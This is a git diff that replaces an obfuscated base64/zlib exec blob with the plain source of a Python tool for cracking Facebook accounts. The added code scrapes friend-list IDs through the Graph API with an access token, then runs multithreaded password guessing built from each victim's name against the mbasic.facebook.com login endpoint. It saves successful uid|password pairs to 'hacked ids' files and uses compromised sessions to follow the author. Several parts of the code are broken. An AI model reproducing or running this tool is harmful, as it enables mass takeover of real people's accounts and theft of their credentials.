@@ -1,4 +1,909 @@
-#Encrypted By AHUXAM
-#facebook : KACHO DHARI AHUZAM /DON,T TRY TO EDIT THIS TOOL/
-import zlib, base64
-exec(zlib.decompress(base64.b64decode("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")))
+#!/usr/bin/python3
+
+import os
+
+try:
+
+    import requests
+
+except ImportError:
+
+    print('\n [Ã¢Å“â€œ] installing requests !...\n')
+
+    os.system('pip install requests')
+
+try:
+
+    import concurrent.futures
+
+except ImportError:
+
+    print('\n [Ã¢Å“â€œ] installing futures !...\n')
+
+    os.system('pip install futures')
+
+try:
+
+    import bs4
+
+except ImportError:
+
+    print('\n [Ã¢Å“â€œ] installing bs4 !...\n')
+
+    os.system('pip install bs4')
+
+import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
+
+from concurrent.futures import ThreadPoolExecutor as mrFOYSAL
+
+from datetime import datetime
+
+from bs4 import BeautifulSoup
+
+ct = datetime.now()
+
+n = ct.month
+
+bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
+
+try:
+
+    if n < 0 or n > 12:
+
+        exit()
+
+    nTemp = n - 1
+
+except ValueError:
+
+    exit()
+
+current = datetime.now()
+
+ta = current.year
+
+bu = current.month
+
+ha = current.day
+
+op = bulan[nTemp]
+
+P = '\x1b[1;97m' # 
+
+M = '\033[1;31m' # 
+
+H = '\033[1;32m' # 
+
+K = '\x1b[1;97m' # 
+
+B = '\x1b[1;97m' # 
+
+U = '\x1b[1;97m' # 
+
+O = '\x1b[1;97m' # 
+
+N = '\x1b[0m'    # 
+
+my_color = [
+
+ P, M, H, K, B, U, O, N]
+
+warna = random.choice(my_color)
+
+data,data2={},{}
+
+aman,cp,salah=0,0,0
+
+ubahP,fuck,pwBaru=[],[],[]
+
+ok = []
+
+cp = []
+
+id = []
+
+user = []
+
+loop = 0
+
+url_lookup = "https://lookup-id.com/"
+
+url_mb = "https://m.facebook.com"
+
+url_ip = "https://www.httpbin.org/ip"
+
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
+
+bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
+
+done = False
+
+def jalan(z):
+
+    for e in z + '\n':
+
+        sys.stdout.write(e)
+
+        sys.stdout.flush()
+
+        time.sleep(0.01)
+
+logo= """ \033[1;32m                                                                                                                           
+
+   ___   __ ____  ______  ___   __  ___
+
+  / _ | / // / / / /_  / / _ | /  |/  /
+
+ / __ |/ _  / /_/ / / /_/ __ |/ /|_/ / 
+
+/_/ |_/_//_/\____/ /___/_/ |_/_/  /_/  
+
+                                    \033
+
+\033[1;35m💙💘✨____________💞💕❣️____________💘💝💕💓
+
+  Auther   : AHUZAM
+
+  \033[1;37mFacebook : Ahuzam hussain
+
+  \033[1;36mtiktok.    : ahuxam
+
+  \033[1;37mNote     : FREE
+
+  \033[1;37mVersion  : 0.3
+
+  \033[1;35mviber     :9725505
+
+🥀✌️💞_____________😛❤️🔥_______________💥💫⭐
+
+"""
+
+def hasil(OK,cp):
+
+	if not len(OK) != 0:
+
+	    pass
+
+	if len(cp) != 0:
+
+	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mFOYSAL_OK.txt' % (H, P, str(len(ok))))
+
+	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mFOYSAL_CP.txt' % (H, P, str(len(cp))))
+
+	    input("\x1b[1;97mPress enter to back FARYAL Menu ")
+
+	    mr()
+
+def mr():
+
+    os.system('clear')
+
+    print(logo)
+
+    os.system('xdg-open https://www.tiktok.com/@ahuxam?_t=8caVVQmGMwT&_r=1')
+
+    ipm = requests.get(url_ip).json()
+
+    todz = ''
+
+    IP = ipm['origin']
+
+    print
+
+    print(' \033[1;33m[1] Start File Cloning')
+
+    print(' \033[1;32m[2] Create File \033[1;37m[Best-Method]')
+
+    print(' \033[1;31m[E] exit ')
+
+    print('')
+
+    _mr___ = input(' \033[1;37m[?] \033[1;37mChoose option : ')
+
+    if _mr___ in ('1', '01'):
+
+        __xxx__().FOYSAL(id)
+
+    if _mr___ in ('2', '02'):
+
+        create_file()
+
+    if _mr___ in ('E', 'ee'):
+
+        pass
+
+class __xxx__:
+
+    def __init__(self):
+
+        self.id = []
+
+    def FOYSAL(self,id):
+
+        os.system("clear")
+
+        print(logo)
+
+        self.cnt = input('\033[1;37mPut File Name : ')
+
+        self.id = open(self.cnt).read().splitlines()
+
+        os.system('clear')
+
+        print(logo)
+
+        print("")
+
+        ___worldwide___ = ('y')
+
+        if ___worldwide___ in ('yes','Yes','Y', 'y'):
+
+            self.__pler__()
+
+        else:
+
+            print(' \033[1;37m[!] Choose Correct One');
+
+            self.FOYSAL(id)
+
+    def __metode__(self, user, __chi__, cebok):
+
+        global ok,cp,loop
+
+        sys.stdout.write(f"\r \x1b[1;97m[FARYAL] {loop}|{len(self.id)} \033[1;32m[ok][{len(ok)}] \033[1;31m[cp][{len(cp)}] ")
+
+        sys.stdout.flush()
+
+        try:
+
+            for pw in __chi__:
+
+                pw = pw.lower()
+
+                session=requests.Session()
+
+                header = {
+
+                    "Host":cebok,
+
+                    "upgrade-insecure-requests":"1",
+
+                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
+
+                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+
+                    "dnt":"1",
+
+                    "x-requested-with":"mark.via.gp",
+
+                    "sec-fetch-site":"same-origin",
+
+                    "sec-fetch-mode":"cors",
+
+                    "sec-fetch-user":"empty",
+
+                    "sec-fetch-dest":"document",
+
+                    "referer":"https://m.facebook.com/",
+
+                    "accept-encoding":"gzip, deflate br",
+
+                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
+
+                }
+
+                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
+
+                das = {
+
+                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
+
+                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
+
+                    "uid":user,
+
+                    "flow":"login_no_pin",
+
+                    "pass":pw,
+
+                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
+
+                }
+
+                header1 = {
+
+                    "Host":cebok,
+
+                    "cache-control":"max-age=0",
+
+                    "upgrade-insecure-requests":"1",
+
+                    "origin":"https://"+cebok,
+
+                    "content-type":"application/x-www-form-urlencoded",
+
+                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
+
+                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+
+                    "x-requested-with":"XMLHttpRequest",
+
+                    "sec-fetch-site":"same-origin",
+
+                    "sec-fetch-mode":"cors",
+
+                    "sec-fetch-user":"empty",
+
+                    "sec-fetch-dest":"document",
+
+                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
+
+                    "accept-encoding":"gzip, deflate br",
+
+                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
+
+                }
+
+                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
+
+                if 'c_user' in session.cookies.get_dict():
+
+                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+
+                    print(f"\r{H} [ahuxam hacked ids-OK] {user} | {pw}")
+
+                    wrt = '%s|%s' % (user,pw)
+
+                    ok.append(wrt)
+
+                    open('ahuxam hacked ids_OK.txt' , 'a').write('%s\n' % wrt)
+
+                    self.follow(session,coki)
+
+                    break
+
+                elif 'checkpoint' in session.cookies.get_dict():
+
+                    try:
+
+                        tokenz = open('.token.txt').read()
+
+                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
+
+                        month, day, year = cp_ttl.split('/')
+
+                        month = bulan_ttl[month]
+
+                        print('\r%s [ahuxam hacked ids-CP] %s | %s ' % (M, user, pw))
+
+                        wrt = '%s|%s' % (user,pw)
+
+                        cp.append(wrt)
+
+                        open('ahuxam hacked ids_CP.txt' , 'a').write('%s\n' % wrt)
+
+                        break
+
+                    except (KeyError, IOError):
+
+                        month = ''
+
+                        day   = ''
+
+                        year  = ''
+
+                    except:
+
+                        pass
+
+                    print('\r%s [ahuxam hacked ids-CP] %s | %s ' % (M, user, pw))
+
+                    wrt = '%s|%s' % (user,pw)
+
+                    cp.append(wrt)
+
+                    open('ahuxam hacked ids_CP.txt' , 'a').write('%s\n' % wrt)
+
+                    break
+
+                else:
+
+                    continue
+
+            loop+=1
+
+        except:
+
+            self.__metode__(user, pw, cebok)
+
+    def follow(self, session, coki):
+
+        r = BeautifulSoup(session.get('https://www.tiktok.com/@ahuxam?_t=8caVVQmGMwT&_r=1', cookies={'cookie': coki}).text, 'html.parser')
+
+        get = r.find('a', string='Ikuti').get('href')
+
+        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
+
+    def __pler__(self):
+
+        print('\033[1;32m[1] Crack With Auto Pass ')
+
+        print('\033[1;36m[2] Crack With Name Digit Pass')
+
+        chi = input('\n \033[1;37m[?] Choose: ')
+
+        if chi == '':
+
+            print('\nSelect Correct One')
+
+            self.__pler__()
+
+        elif chi in ('1', '01'):
+
+            os.system("clear")
+
+            print(logo)
+
+            print("\033[1;31m\rUse flight (\033[1;37mairplane) \033[1;31mmode before use\033[1;32m")
+
+            print(47*"-")
+
+            print('\033[1;32m Total Auto file IDs : %s ' % len(self.id))
+
+            print('\033[1;32m Cracking Started...')
+
+            print(47*"-")
+
+            with mrFOYSAL(max_workers=30) as DADAXworld:
+
+                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
+
+                    try:
+
+                        uid, name = zsb.split('|')
+
+                        xz = name.split(' ')
+
+                        first, last = name.split(' ')
+
+                        firstl = first.lower()
+
+                        lastl = last.lower()
+
+                        firsts = first.capitalize()
+
+                        lasts = last.capitalize()
+
+                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+
+                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
+
+                        else:
+
+                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
+
+                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
+
+                        FOYSALworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+
+                    except:
+
+                        pass
+
+            hasil(ok,cp)
+
+        elif chi in ('2', '02'):
+
+            os.system("clear")
+
+            print(logo)
+
+            print("\033[1;37m\rEnter Last Name Digits\033[1;37m\n")
+
+            p1 = input('  Name + 1 : ')
+
+            p2 = input('  Name + 2 : ')
+
+            p3 = input('  Name + 3 : ')
+
+            p4 = input('  Name + 4 : ')
+
+            os.system("clear")
+
+            print(logo)
+
+            print("\033[1;31m\rUse flight (airplane) mode before use\033[1;37m")
+
+            print(47*"-")
+
+            print('\033[1;37m Total IDs : %s ' % len(self.id))
+
+            print('\033[1;37m Cracking Started...')
+
+            print(47*"-")
+
+            with mrFOYSAL(max_workers=30) as FOYSALworld:
+
+                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
+
+                    try:
+
+                        uid, name = zsb.split('|')
+
+                        xz = name.split(' ')
+
+                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+
+                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
+
+                        else:
+
+                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
+
+                        FOYSALworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+
+                    except:
+
+                        pass
+
+            hasil(ok,cp)
+
+        else:
+
+            print('\n Select Valid One')
+
+            self.__pler__()
+
+def create_file():
+
+    os.system('clear')
+
+    print(logo)
+
+    print('  \033[1;37m[1] Create file manual')
+
+    print('  \033[1;33m[2] Create file auto')
+
+    print('  \033[1;31m[B] Back to main menu')
+
+    print(50*'-')
+
+    cf = input('  \033[1;37mChoose method: ')
+
+    if cf =='1':
+
+        manual()
+
+    elif cf =='2':
+
+        auto()
+
+    elif cf =='3':
+
+        likes()
+
+    elif cf =='3' or cf =='b' or cf =='B':
+
+        main()
+
+    else:
+
+        print('\n  Choose correct option ...')
+
+        time.sleep(1)
+
+        create_file()
+
+def manual():
+
+    try:
+
+        token = open('/sdcard/tokenofl.txt', 'r').read()
+
+    except FileNotFoundError:
+
+        login()
+
+    try:
+
+        r = requests.get('https://graph.facebook.com/me?access_token='+token).text
+
+        q = json.loads(r)
+
+        uname = q['name']
+
+    except (KeyError):
+
+        login()
+
+    os.system('clear')
+
+    print(logo)
+
+    print('  Name: '+uname)
+
+    print(50*'-')
+
+    limit = int(input('  How many ids do you want to add ? '))
+
+    save_file = input('  Save file as: ')
+
+    t = 0
+
+    for u in range(limit):
+
+        t+=1
+
+        try:
+
+            ids = input('  Put id no%s: '%t)
+
+            r = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+token).text
+
+            q = json.loads(r)
+
+            for j in q['data']:
+
+                uids = j['id']
+
+                names = j['name']
+
+                first_name = names.split(' ')[0]
+
+                try:
+
+                    last_name = names.split(' ')[1]
+
+                except:
+
+                    last_name = 'Khan'
+
+                with open('/sdcard/'+save_file, 'a') as rd:
+
+                    rd.write(uids+'|'+first_name+'|'+last_name+'\n')
+
+        except KeyError:
+
+            print('  No friend for '+ids)
+
+            pass
+
+    print(50*'-')
+
+    print('  Ids saved as: '+save_file)
+
+    print(50*'-')
+
+    input(' Press enter to back')
+
+    mr()
+
+    
+
+def auto():
+
+    os.system('rm -rf temp*')
+
+    try:
+
+        access_token = open('/sdcard/tokenofl.txt', 'r').read()
+
+    except:
+
+        login()
+
+    try:
+
+        r = requests.get('https://graph.facebook.com/me?access_token='+access_token).text
+
+        q = json.loads(r)
+
+        uname = q['name']
+
+    except:
+
+        login()
+
+    os.system('clear')
+
+    print(logo)
+
+    print('  Logged user: '+uname)
+
+    print(50*'-')
+
+    nusrat = []
+
+    try:
+
+        limit_user = int(input('  How many ids do you want to add ? '))
+
+    except:
+
+        limit_user = 1
+
+    count = 0
+
+    for fir in range(limit_user):
+
+        count +=1
+
+        udit = input('  Put id%s: '%(count))
+
+        try:
+
+            tfile = open('/sdcard/tokenofl.txt','r').read()
+
+            fr = requests.get('https://graph.facebook.com/'+udit+'/friends?limit=5000&access_token='+tfile).text
+
+            qfr = json.loads(fr)
+
+            temp_save = open('temp.txt', 'a')
+
+            for data in qfr['data']:
+
+                uids = data['id']
+
+                if uids in nusrat:
+
+                    pass
+
+                else:
+
+                    nusrat.append(uids)
+
+                    temp_save.write(uids+'\n')
+
+            temp_save.close()
+
+        except KeyError:
+
+            if 'invalid' in str(fr):
+
+                print('  Logged token has expired ...')
+
+                pass
+
+            else:
+
+                print('  No friends found for user: '+udit)
+
+                pass
+
+    os.system('clear')
+
+    print(logo)
+
+    print('   Total ids: '+str(len(nusrat)))
+
+    print(50*'-')
+
+    try:
+
+        ask_link = int(input('  How many links do you want to grab? '))
+
+    except:
+
+        ask_link = 1
+
+    completed = 0
+
+    for links in range(ask_link):
+
+        completed +=1
+
+        li = input('  %s Link start with: '%completed)
+
+        os.system('cat temp.txt | grep "'+li+'" >> temp2.txt')
+
+    save_file = input('  Save file as: ')
+
+    os.system('clear')
+
+    lines = open('temp2.txt', 'r').readlines()
+
+    print(logo)
+
+    print('  Total ids to grab: '+str(len(lines)))
+
+    print('  Grabbing Process has started')
+
+    print(50*'-')
+
+    fileid = 'temp2.txt'
+
+    fileidopen = open(fileid, 'r').read().splitlines()
+
+    dill = []
+
+    for ids in fileidopen:
+
+        try:
+
+            tfile = open('/sdcard/tokenofl.txt','r').read()
+
+            rg = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+tfile).text
+
+            rgq = json.loads(rg)
+
+            idsave=open('/sdcard/'+save_file, 'a')
+
+            for inayat in rgq['data']:
+
+                uids = inayat['id']
+
+                dill.append(uids)
+
+                nm = inayat['name']
+
+                first_name = nm.split(' ')[0]
+
+                try:
+
+                    last_name = nm.split(' ')[1]
+
+                except:
+
+                    last_name = 'Khan'
+
+                idsave.write(uids+'|'+first_name+'|'+last_name+'\n')
+
+            print('  Grabbed from: '+ids)
+
+           # print('  Total friends: '+str(len(uids)))
+
+            print('  Token status: Live')
+
+            print(50*'-')
+
+            idsave.close()
+
+        except Exception as e:
+
+            #print(e)
+
+            if 'invalid' in str(rg):
+
+                print('  Token has expired, try again ...')
+
+                os.system('rm -rf temp*')
+
+                pass
+
+            else:
+
+                print('  Grabbed from: '+ids)
+
+                print('  Friendlist ids: 0')
+
+                print('  Token status: Live')
+
+                print(50*'-')
+
+                os.system('rm -rf temp*')
+
+                pass
+
+    lenid = open('/sdcard/'+save_file, 'r').readlines()
+
+    print('  Grabbing Process has completed ')
+
+    os.system('rm -rf temp*')
+
+    print('  Total ids grabbed: '+str(len(lenid)))
+
+    print('  File saved as: /sdcard/'+save_file)
+
+    print(50*'-')
+
+    input('  Press enter to back ')
+
+    FOYSAL()
+
+    
+
+    
+
+    
+
+mr()
